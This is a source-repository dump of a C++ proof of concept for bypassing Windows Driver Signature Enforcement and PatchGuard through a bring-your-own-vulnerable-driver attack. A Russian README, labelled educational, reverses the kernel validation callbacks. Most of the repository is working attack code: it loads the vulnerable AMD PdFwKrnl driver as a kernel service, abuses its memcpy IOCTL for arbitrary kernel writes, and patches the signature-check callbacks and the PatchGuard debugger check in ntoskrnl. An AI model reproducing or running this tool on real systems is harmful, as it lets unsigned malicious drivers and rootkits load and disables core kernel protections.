Project Path: arc_gmh5225_dse_pg_bypass_t0or2734

Source Tree:

```txt
arc_gmh5225_dse_pg_bypass_t0or2734
├── CMakeLists.txt
├── LICENSE
├── README.md
├── img
│   └── dse_pg_bypass.gif
├── includes
│   ├── amd.h
│   ├── byovd.h
│   ├── kernel_utils.h
│   └── pattern.h
└── src
    ├── amd.cpp
    ├── byovd.cpp
    ├── dse_pg_bypass.cpp
    ├── kernel_utils.cpp
    └── pattern.cpp

```

`CMakeLists.txt`:

```txt
cmake_minimum_required(VERSION 3.22)

set(PATCH_VERSION "1" CACHE INTERNAL "Patch version")
set(PROJECT_VESRION 0.0.${PATCH_VERSION})
project(DSE_PG_BYPASS VERSION ${PROJECT_VESRION})

include_directories(includes src)

add_executable(
  dse_pg_bypass
  src/amd.cpp
  src/byovd.cpp
  src/kernel_utils.cpp
  src/pattern.cpp
  src/dse_pg_bypass.cpp
)

set_target_properties(
  dse_pg_bypass
  PROPERTIES
  CXX_STANDARD 17
  CXX_STANDARD_REQUIRED ON
)

if (MSVC)
  target_compile_options(dse_pg_bypass PRIVATE /W4)
else ()
  target_link_options(dse_pg_bypass PRIVATE -static-libgcc -static-libstdc++)

  target_compile_options(
    dse_pg_bypass 
    PRIVATE
    -Wall 
    -Wextra 
    -pedantic 
  )
endif()

install(
    TARGETS 
    dse_pg_bypass
    RUNTIME DESTINATION . COMPONENT release
)

set(CPACK_ARCHIVE_COMPONENT_INSTALL ON)
set(CPACK_COMPONENTS_ALL release)

# CPack area
if (WIN32)
  set(CPACK_GENERATOR "ZIP")
else()
  set(CPACK_GENERATOR "DEB")
endif()
set(CPACK_PACKAGE_VERSION "0.0.1")
set(CPACK_PACKAGE_VERSION_MAJOR "0")
set(CPACK_PACKAGE_VERSION_MINOR "0")
set(CPACK_PACKAGE_VERSION_PATCH "1")
set(CPACK_PACKAGE_CONTACT https://github.com/4l3x777/dse_pg_bypass)
include(CPack)
```

`LICENSE`:

```
MIT License

Copyright (c) 2024 4l3x777

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# DSE & PG bypass via BYOVD attack

+ Обход Driver Signature Enforcement и Patch Guard через BYOVD атаку
+ Данный подход предствлен в образовательных целях (For Educational Purpose)

## WriteUP Reversing Signature Validation

+ Функции ядра Windows, участвующие в валидации image (driver) PE
+ Интересущие методы, приведенные указатели функций, возвращающие NTSTATUS
+ `qword_140C375A0` и `qword_140C375С8`

```C++
__int64 __fastcall SeValidateImageHeader(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        int a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        char a10)
{
  if ( qword_140C375A0 )
  {
    if ( (a10 & 1) != 0 )
      _InterlockedCompareExchange(&dword_140D0C720, 0, 0);
    return (unsigned int)((__int64 (__fastcall *)(__int64, __int64))qword_140C375A0)(a1, a2);
  }
  else
  {
    return (unsigned int)-1073740760; //0x0C0000428 STATUS_INVALID_IMAGE_HASH
  }
}

// Представление SeValidateImageHeader в WinDBG 
nt!SeValidateImageHeader:
fffff801`170f2b98 488bc4          mov     rax,rsp
fffff801`170f2b9b 48895808        mov     qword ptr [rax+8],rbx
fffff801`170f2b9f 48897010        mov     qword ptr [rax+10h],rsi
fffff801`170f2ba3 57              push    rdi
fffff801`170f2ba4 4881eca0000000  sub     rsp,0A0h
fffff801`170f2bab 33f6            xor     esi,esi
fffff801`170f2bad 488bda          mov     rbx,rdx
// нас интересует данный callback
fffff801`170f2bb0 483935e9495400  cmp     qword ptr [nt!SeCiCallbacks+0x20 (fffff801`17a375a0)],rsi // адресация на qword_140C375A0 -> RVA 0xc375a0
...................................................
```

```C++
__int64 __fastcall SeValidateImageData(__int64 a1)
{
  if ( qword_140C375С8 )
    return qword_140C375С8(a1);
  else
    return 3221226536i64; //0x0C0000428 STATUS_INVALID_IMAGE_HASH
}

// Представление SeValidateImageData в WinDBG 
nt!SeValidateImageData:
fffff802`17086b0c 4883ec48        sub     rsp,48h
// нас интересует данный callback
fffff802`17086b10 488b05b10a5b00  mov     rax,qword ptr [nt!SeCiCallbacks+0x28 (fffff802`176375c8)] // адресация на qword_140C375C8 -> RVA 0xc375c8
fffff802`17086b17 4c8bd1          mov     r10,rcx
fffff802`17086b1a 4885c0          test    rax,rax
fffff802`17086b1d 7420            je      nt!SeValidateImageData+0x33 (fffff802`17086b3f)
...................................................
```

## WriteUP Reversing PatchGuard

+ PatchGuard работает на контекстах

```C++
nt!KiFilterFiberContext+0x1b00:
fffff802`17517730 4c894c2420      mov     qword ptr [rsp+20h],r9
fffff802`17517735 4489442418      mov     dword ptr [rsp+18h],r8d
fffff802`1751773a 894c2408        mov     dword ptr [rsp+8],ecx
fffff802`1751773e 53              push    rbx
fffff802`1751773f 56              push    rsi
fffff802`17517740 57              push    rdi
fffff802`17517741 4154            push    r12
fffff802`17517743 4155            push    r13
fffff802`17517745 4156            push    r14
fffff802`17517747 4157            push    r15
fffff802`17517749 4881ec60220000  sub     rsp,2260h
fffff802`17517750 498bc1          mov     rax,r9
fffff802`17517753 8bf2            mov     esi,edx
fffff802`17517755 fa              cli
fffff802`17517756 33c9            xor     ecx,ecx

// Нас интересует данная проверка на наличие отладчика
fffff802`17517758 380d2b341400    cmp     byte ptr [nt!KdDebuggerNotPresent (fffff802`1765ab89)],cl

// Если отладчика нет - поток выполняется далее
fffff802`1751775e 7502            jne     nt!KiFilterFiberContext+0x1b32 (fffff802`17517762)

// Если отладчик есть - в бесконечный цикл
nt!KiFilterFiberContext+0x1b30:
fffff802`17517760 ebfe            jmp     nt!KiFilterFiberContext+0x1b30 (fffff802`17517760)

...................................................

// PS: весь код данной функции сильно обфусцирован (далее фрагмент с junk кодом)
!KiFilterFiberContext+0x1b4e:
fffff802`1751777e 8d46fd          lea     eax,[rsi-3]
fffff802`17517781 a9fdffffff      test    eax,0FFFFFFFDh
fffff802`17517786 7504            jne     nt!KiFilterFiberContext+0x1b5c (fffff802`1751778c)  

nt!KiFilterFiberContext+0x1b58:
fffff802`17517788 33c0            xor     eax,eax
fffff802`1751778a 8bf0            mov     esi,eax

nt!KiFilterFiberContext+0x1b5c:
fffff802`1751778c 8b8424c0220000  mov     eax,dword ptr [rsp+22C0h]
fffff802`17517793 eb18            jmp     nt!KiFilterFiberContext+0x1b7d (fffff802`175177ad)  

nt!KiFilterFiberContext+0x1b65:
fffff802`17517795 413bf7          cmp     esi,r15d
fffff802`17517798 7705            ja      nt!KiFilterFiberContext+0x1b6f (fffff802`1751779f)  

nt!KiFilterFiberContext+0x1b6a:
fffff802`1751779a 0fa3f2          bt      edx,esi
fffff802`1751779d 7204            jb      nt!KiFilterFiberContext+0x1b73 (fffff802`175177a3)  

nt!KiFilterFiberContext+0x1b6f:
fffff802`1751779f 33c0            xor     eax,eax
fffff802`175177a1 8bf0            mov     esi,eax

nt!KiFilterFiberContext+0x1b73:
fffff802`175177a3 8b8424c0220000  mov     eax,dword ptr [rsp+22C0h]
fffff802`175177aa 410bc5          or      eax,r13d

nt!KiFilterFiberContext+0x1b7d:
fffff802`175177ad 89842498030000  mov     dword ptr [rsp+398h],eax
fffff802`175177b4 83fe07          cmp     esi,7
fffff802`175177b7 7453            je      nt!KiFilterFiberContext+0x1bdc (fffff802`1751780c)  

nt!KiFilterFiberContext+0x1b89:
fffff802`175177b9 e842c30700      call    nt!KiAreCodePatchesAllowed (fffff802`17593b00)
fffff802`175177be 85c0            test    eax,eax
fffff802`175177c0 744a            je      nt!KiFilterFiberContext+0x1bdc (fffff802`1751780c)  

nt!KiFilterFiberContext+0x1b92:
fffff802`175177c2 e821d20400      call    nt!KiSwInterruptPresent (fffff802`175649e8)
fffff802`175177c7 85c0            test    eax,eax
fffff802`175177c9 7841            js      nt!KiFilterFiberContext+0x1bdc (fffff802`1751780c)  

nt!KiFilterFiberContext+0x1b9b:
fffff802`175177cb e858b00100      call    nt!KiFilterFiberContext+0x1cbf8 (fffff802`17532828)
fffff802`175177d0 85c0            test    eax,eax
fffff802`175177d2 7438            je      nt!KiFilterFiberContext+0x1bdc (fffff802`1751780c)  

nt!KiFilterFiberContext+0x1ba4:
fffff802`175177d4 e873c30700      call    nt!KiGetLoadOptions (fffff802`17593b4c)
fffff802`175177d9 488d15c0bb0500  lea     rdx,[nt! ?? ::PBOPGDP::`string' (fffff802`175733a0)]
fffff802`175177e0 488bc8          mov     rcx,rax
fffff802`175177e3 488bd8          mov     rbx,rax
fffff802`175177e6 e875f18bff      call    nt!strstr (fffff802`16dd6960)
fffff802`175177eb 4885c0          test    rax,rax
fffff802`175177ee 751c            jne     nt!KiFilterFiberContext+0x1bdc (fffff802`1751780c)  
...................................................
```

## BYOVD attack

+ используется уязвимый драйвер AMD `PdFwKrnl`
+ используется примитив `memcpy` from virtual to physical memory

## Пример работы

+ тестовая система Windows 11 версии 10.0.22631.3374 с последними обновлениями

![alt text](/img/dse_pg_bypass.gif)

## Ссылки

+ [LolDriver PoC](https://github.com/TakahiroHaruyama/VDR/tree/main/PoCs/firmware/eop_pdfwkrnl.py)
+ [LolDriver Link](https://www.loldrivers.io/drivers/fded7e63-0470-40fe-97ed-aa83fd027bad/)
+ [PatchGuard Article](https://habr.com/ru/companies/pt/articles/246841/)
+ [PatchNtoskrnl](https://github.com/Mattiwatti/EfiGuard/blob/25bb182026d24944713e36f129a93d08397de913/EfiGuardDxe/PatchNtoskrnl.c)

```

`includes/amd.h`:

```h
#pragma once
#include <Windows.h>

#define FILE_DEVICE_AMD_PDFW  (DWORD)0x8000
#define PDFW_MEMCPY_FUNC (DWORD)0x805

#define IOCTL_AMDPDFW_MEMCPY \
	CTL_CODE(FILE_DEVICE_AMD_PDFW, PDFW_MEMCPY_FUNC, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002014

typedef struct _PDFW_MEMCPY {
    BYTE Reserved[16];
    PVOID Destination;
    PVOID Source;
    PVOID Reserved2;
    DWORD Size;
    DWORD Reserved3;
} PDFW_MEMCPY, * PPDFW_MEMCPY;

namespace amd
{
BOOL WINAPI WriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI ReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);
}
```

`includes/byovd.h`:

```h
#pragma once
#include <Windows.h>
#include <string>
#include <iostream>

class BYOVD_PROVIDER 
{
    HANDLE _device {INVALID_HANDLE_VALUE};
    char _device_name[FILENAME_MAX];
    char _driver_name[FILENAME_MAX];
    char _driver_path[FILENAME_MAX];
    char _service_name[FILENAME_MAX];

    bool file_exists();
    void create_service();
    bool load_driver();
    bool is_mandatory_high_process();
    void remove_service();

public:
    bool WriteVirtualMemory(ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);
    bool ReadVirtualMemory(ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes);  
    BYOVD_PROVIDER(const std::string& driver_name, const std::string& device_name);
    ~BYOVD_PROVIDER();
};
```

`includes/kernel_utils.h`:

```h
#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <iostream>

class KernelUtils
{
    inline static std::string kernel_path = "c:\\windows\\system32\\ntoskrnl.exe";
public:
    static DWORD64 ntoskrnl_base();
    static DWORD64 get_sevalidateimageheader_offset();
    static DWORD64 get_sevalidateimagedata_offset();
    static DWORD64 get_ret_offset();
    static DWORD64 get_patchguard_offset();
    static DWORD64 get_patchguardvalue_offset();

};
```

`includes/pattern.h`:

```h
#pragma once
// IDA search pattern library
// 4l3x777

#include <cstdint>   
#include <string>   
#include <Windows.h> 
#include <Psapi.h>
#include <vector>
#include <optional>
#include <sstream>
#include <array>

namespace scanner
{
    class handle {
    public:
        handle() = default;
        explicit handle(uintptr_t address, uintptr_t module_handle) : m_address(address), m_module_handle(module_handle) {}

        template <typename T>
        T as() const {
            return reinterpret_cast<T>(m_address);
        }

        handle add(uintptr_t offset) const {
            if (m_address != 0)
            {
                return handle(m_address + offset, m_module_handle);
            }

            return *this;
        }

        handle sub(uintptr_t offset) const {
            if (m_address != 0)
            {
                return handle(m_address - offset, m_module_handle);
            }

            return *this;
        }

        handle rip() const {
            if (m_address != 0)
            {
                auto offset = *as<int32_t*>();
                return add(offset + sizeof(int32_t));
            }

            return *this;
        }

        template <typename T>
        T get_base() const {
            return reinterpret_cast<T>(m_module_handle);
        }

    private:
        uintptr_t m_address = 0;
        uintptr_t m_module_handle = 0;
    };


    class _module {
    public:
        _module(const char* module) : m_module(module)
        {
            m_module_handle = LoadLibraryA(m_module);
        }

        handle get_export(const char* func)
        {
            return handle((std::uintptr_t)GetProcAddress(m_module_handle, func), (std::uintptr_t)m_module_handle);
        }

        HMODULE get_handle()
        {
            return m_module_handle;
        }

    private:
        const char* m_module;
        HMODULE m_module_handle;
    };

    class pattern {
    public:
        pattern(const std::string& module);
        ~pattern() noexcept;

        pattern& scan_now(const char* sig_name, const char* ida_sig, const char* section_name = nullptr);

        handle get_result();

    private:
        std::string m_module_name;
        _module m_module;
        size_t m_module_size;
        HMODULE m_module_handle;
        handle m_result;
    };
}
```

`src/amd.cpp`:

```cpp
#include "amd.h"

namespace amd
{

BOOL WINAPI ReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = Buffer;
    request.Source = (PVOID)Address;
    request.Size = NumberOfBytes;

    DWORD BytesReturned;


    return DeviceIoControl(
        DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &BytesReturned,NULL
    );
}

BOOL WINAPI WriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = (PVOID)Address;
    request.Source = Buffer;
    request.Size = NumberOfBytes;

    DWORD BytesReturned;

    return DeviceIoControl(
        DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &BytesReturned,
        NULL
    );
}
};
```

`src/byovd.cpp`:

```cpp
#include <byovd.h>
#include <amd.h>

bool BYOVD_PROVIDER::is_mandatory_high_process()
{
    DWORD dwLengthNeeded = 0;
    bool result = false;
    GetTokenInformation(GetCurrentProcessToken(), TokenIntegrityLevel, NULL, 0, &dwLengthNeeded);
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLengthNeeded);
    if (GetTokenInformation(GetCurrentProcessToken(), TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded))
    {
        auto dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
        if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
        {
            result = true;
        }
    }
    LocalFree(pTIL);
    return result;
}

void BYOVD_PROVIDER::remove_service()
{
    char service_stop[FILENAME_MAX];
    sprintf_s(service_stop, "sc stop %s>NUL", _service_name);
    system(service_stop);

    char service_delete[FILENAME_MAX];
    sprintf_s(service_delete, "sc delete %s>NUL", _service_name);
    system(service_delete);
}

bool BYOVD_PROVIDER::file_exists()
{
  DWORD dwAttrib = GetFileAttributesA(_driver_path);
  return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
};

void BYOVD_PROVIDER::create_service()
{
    char service_create[FILENAME_MAX * 2];
    memset(service_create, 0x0, FILENAME_MAX * 2);
    sprintf_s(service_create, "sc create %s binpath=\"%s\" type=kernel>NUL", _service_name, _driver_path);
    system(service_create);

    char service_start[FILENAME_MAX];
    memset(service_start, 0x0, FILENAME_MAX);
    sprintf_s(service_start, "sc start %s>NUL", _service_name);
    system(service_start);
};

bool BYOVD_PROVIDER::load_driver() 
{
    if (is_mandatory_high_process())
    {
        char device_string[FILENAME_MAX];
        memset(device_string, 0x0, FILENAME_MAX);
        strcat_s(device_string, "\\\\.\\");
        strcat_s(device_string, _device_name);
        _device = CreateFileA(device_string, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (_device == INVALID_HANDLE_VALUE)
        {
            if (!file_exists())
            {
                std::cout << "[!] could not find driver in path [" << _driver_path << "]" << std::endl;
                return false;
            }
            std::cout << "[+] remove service" << std::endl;
            remove_service();

            std::cout << "[+] create new service" << std::endl;
            create_service();
            _device = CreateFileA(device_string, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        }
        std::cout << "[+] open driver handle" << std::endl;
        return true;
    }
    else 
    {
        std::cout << "Need Administrator privileges to manage services!" << std::endl;
        return false;
    }
}

bool BYOVD_PROVIDER::WriteVirtualMemory(ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes)
{
    if (_device == INVALID_HANDLE_VALUE)
    {
        if (load_driver()) return amd::WriteVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
        else return false;
    }
    return amd::WriteVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
}

bool BYOVD_PROVIDER::ReadVirtualMemory(ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes)
{
    if (_device == INVALID_HANDLE_VALUE)
    {
        if (load_driver()) return amd::ReadVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
        else return false;
    }
    return amd::ReadVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
}

BYOVD_PROVIDER::BYOVD_PROVIDER(const std::string& driver_name, const std::string& device_name)
{
    memset(_service_name, 0x0, FILENAME_MAX);
    memset(_driver_name, 0x0, FILENAME_MAX);
    memset(_device_name, 0x0, FILENAME_MAX);
    memset(_driver_path, 0x0, FILENAME_MAX);

    strcat_s(_service_name, "byovd_provider");
    strcat_s(_driver_name, driver_name.c_str());
    strcat_s(_device_name, device_name.c_str());

    GetCurrentDirectoryA(FILENAME_MAX, _driver_path);
    strcat_s(_driver_path, "\\");
    strcat_s(_driver_path, _driver_name);
};

BYOVD_PROVIDER::~BYOVD_PROVIDER()
{
    if (_device != INVALID_HANDLE_VALUE) remove_service();
};

```

`src/dse_pg_bypass.cpp`:

```cpp
#include <iostream>
#include <string>
#include <byovd.h>
#include <kernel_utils.h>
#include <pattern.h>

int main(int argc, char* argv[])
{
	std::cout << "[*] PoC Driver Signature Enforcement (DSE) & PatchGurd Bypass by 4l3x777" << std::endl;	
	auto base_addr = KernelUtils::ntoskrnl_base();

	auto SeValidateImageHeader_offset = KernelUtils::get_sevalidateimageheader_offset();
	auto SeValidateImageData_offset = KernelUtils::get_sevalidateimagedata_offset();
	auto offset_ret = KernelUtils::get_ret_offset();
	auto patchguard_value_offset = KernelUtils::get_patchguardvalue_offset();
	auto PatchGuard_offset = KernelUtils::get_patchguard_offset();

	// load driver
	BYOVD_PROVIDER byovd_provider("PdFwKrnl.sys", "PdFwKrnl");

	auto addr_offset_ret = base_addr + offset_ret;
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageHeader_offset, &addr_offset_ret, 8);
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageData_offset, &addr_offset_ret, 8);
	
	auto addr_patchgurd_value = base_addr + patchguard_value_offset;
	byovd_provider.WriteVirtualMemory(base_addr + PatchGuard_offset, &addr_patchgurd_value, 8);

	std::cout << "[*] done!" << std::endl;
	return 0;
}

```

`src/kernel_utils.cpp`:

```cpp
#include <kernel_utils.h>
#include <pattern.h>

DWORD64 KernelUtils::ntoskrnl_base() 
{
	DWORD cbNeeded = 0;
	LPVOID drivers[1024] = { 0 };
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) return (DWORD64)drivers[0];
	else return 0;
}

DWORD64 KernelUtils::get_sevalidateimageheader_offset()
{
	auto SeValidateImageHeader_sig = scanner::pattern(kernel_path.c_str()).scan_now("SeValidateImageHeader", "48 39 35 ? ? ? ? 48 8B F9 48 89 70 F0 44 8B DE").get_result();
	auto sig_pattern_begin = SeValidateImageHeader_sig.as<uint8_t*>(); 
	uint32_t rip_offset_SeValidateImageHeader_callback = *(uint32_t*)(&sig_pattern_begin[3]);
	uint32_t rip_instruction_length = 7;
	auto SeValidateImageHeader_callback_addr = SeValidateImageHeader_sig.add(rip_offset_SeValidateImageHeader_callback + rip_instruction_length).as<uint64_t*>();
	return (uint64_t)SeValidateImageHeader_callback_addr - (uint64_t)SeValidateImageHeader_sig.get_base<uint64_t*>();
}

DWORD64 KernelUtils::get_sevalidateimagedata_offset()
{
	auto SeValidateImageData_sig = scanner::pattern(kernel_path.c_str()).scan_now("SeValidateImageData", "48 8B 05 ? ? ? ? 4C 8B D1 48 85 C0 74 ?").get_result();
	auto sig_pattern_begin = SeValidateImageData_sig.as<uint8_t*>(); 
	uint32_t rip_offset_SeValidateImageData_callback = *(uint32_t*)(&sig_pattern_begin[3]);
	uint32_t rip_instruction_length = 7;
	auto SeValidateImageData_callback_addr = SeValidateImageData_sig.add(rip_offset_SeValidateImageData_callback + rip_instruction_length).as<uint64_t*>();
	return (uint64_t)SeValidateImageData_callback_addr - (uint64_t)SeValidateImageData_sig.get_base<uint64_t*>();
}

DWORD64 KernelUtils::get_ret_offset()
{
	auto ret_sig = scanner::pattern(kernel_path.c_str()).scan_now("ret", "B8 01 00 00 00 C3", ".text").get_result();
	auto ret_addr = ret_sig.as<uint64_t*>(); 
	return (uint64_t)ret_addr - (uint64_t)ret_sig.get_base<uint64_t*>();       
}

DWORD64 KernelUtils::get_patchguard_offset()
{
	auto PatchGuard_sig = scanner::pattern(kernel_path.c_str()).scan_now("PatchGuard", "38 0D ? ? ? ? 75 02 EB FE").get_result();
	auto sig_pattern_begin = PatchGuard_sig.as<uint8_t*>(); 
	uint32_t rip_offset_PatchGuard_callback = *(uint32_t*)(&sig_pattern_begin[2]);
	uint32_t rip_instruction_length = 6;
	auto PatchGuard_callback_addr = PatchGuard_sig.add(rip_offset_PatchGuard_callback + rip_instruction_length).as<uint64_t*>();
	return (uint64_t)PatchGuard_callback_addr - (uint64_t)PatchGuard_sig.get_base<uint64_t*>();
}

DWORD64 KernelUtils::get_patchguardvalue_offset()
{
	auto patchguardvalue_sig = scanner::pattern(kernel_path.c_str()).scan_now("patchguardvalue", "00 00 00 00 00 00 00 00", ".rdata").get_result();
	auto patchguardvalue_addr = patchguardvalue_sig.as<uint64_t*>(); 
	return (uint64_t)patchguardvalue_addr - (uint64_t)patchguardvalue_sig.get_base<uint64_t*>();    
}
```

`src/pattern.cpp`:

```cpp
#include <pattern.h>

namespace scanner
{
    std::vector<std::optional<uint8_t>> parse_ida_signature(const char* sig) {
        std::vector<std::optional<uint8_t>> bytes;
        std::stringstream ss(sig);

        while (!ss.eof()) {
            std::string byte_str;
            ss >> byte_str;

            if (byte_str == "?" || byte_str == "??") {
                bytes.push_back(std::nullopt);
                continue;
            }

            if (byte_str.length() != 2) {
                throw std::runtime_error("Invalid byte in IDA signature: " + byte_str);
            }

            char* end;
            long value = strtol(byte_str.c_str(), &end, 16);

            if (*end != '\0') {
                throw std::runtime_error("Invalid byte in IDA signature: " + byte_str);
            }

            bytes.push_back(static_cast<uint8_t>(value));
        }

        return bytes;
    }


    pattern::pattern(const std::string& module) : m_module(module.c_str()), m_module_name(module), m_result(0, (uintptr_t)0)
    {
        m_module_handle = LoadLibraryA(m_module_name.c_str());

        if (m_module_handle == nullptr) {
            throw std::runtime_error("Could not find module: " + m_module_name);
        }

        MODULEINFO mi = { 0 };

        if (!GetModuleInformation(GetCurrentProcess(), m_module_handle, &mi, sizeof(mi))) {
            throw std::runtime_error("Could not get module information");
        }
        m_module_size = mi.SizeOfImage;
    }

    pattern::~pattern() 
    {
        if (m_module_handle) FreeLibrary(m_module_handle);
    }

    pattern& pattern::scan_now(const char* sig_name, const char* ida_sig, const char* section_name)
    {
        auto signature = parse_ida_signature(ida_sig);

        std::uintptr_t base_address = reinterpret_cast<std::uintptr_t>(m_module_handle);

        std::size_t sig_size = signature.size();
        std::uintptr_t end_address = base_address + m_module_size - sig_size;

        std::array<int, 256> bad_char;
        for (int i = 0; i < 256; ++i) {
            bad_char[i] = sig_size;
        }
        for (int i = 0; i < sig_size - 1; ++i) {
            if (signature[i].has_value()) {
                bad_char[signature[i].value()] = sig_size - i - 1;
            }
            else {
                for (int j = 0; j < 256; ++j) {
                    bad_char[j] = min(bad_char[j], sig_size - i - 1);
                }
            }
        }

        std::uintptr_t i = 0;
        if (section_name == nullptr) i = base_address + sig_size - 1;
        else 
        {
            PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)base_address;
            PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)base_address + pDosHeader->e_lfanew);
            PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

            LPVOID lpFoundAddress = NULL;

            for (WORD j = 0; j < pNtHeaders->FileHeader.NumberOfSections; j++) 
            {
                if (strcmp((CHAR*)pSectionHeader[j].Name, section_name) == 0) 
                {
                    lpFoundAddress = (LPVOID)((LPBYTE)base_address + pSectionHeader[j].VirtualAddress);
                    i = (uintptr_t)lpFoundAddress + sig_size - 1;

                    SIZE_T dwSectionSize = pSectionHeader[j].Misc.VirtualSize;
                    end_address = (uintptr_t)lpFoundAddress + dwSectionSize - sig_size;
                    break;
                }
            }

            if (lpFoundAddress == NULL) 
            {
                throw std::runtime_error(std::string("Section ") + section_name + " not found!");
            }
        }   

        while (i < end_address) {
            int j = sig_size - 1;
            while (j >= 0) {
                if (signature[j].has_value() && signature[j].value() != *reinterpret_cast<uint8_t*>(i - sig_size + j + 1))
                    break;
                --j;
            }
            if (j < 0) {
                m_result = handle(i - sig_size + 1, (uintptr_t)m_module_handle);
                return *this;
            }
            i += max(bad_char[*reinterpret_cast<uint8_t*>(i)], static_cast<int>(sig_size - j - 1));
        }

        m_result = handle(0, (uintptr_t)m_module_handle); 

        return *this;
    }

    handle pattern::get_result()
    {
        return m_result;
    }
}
```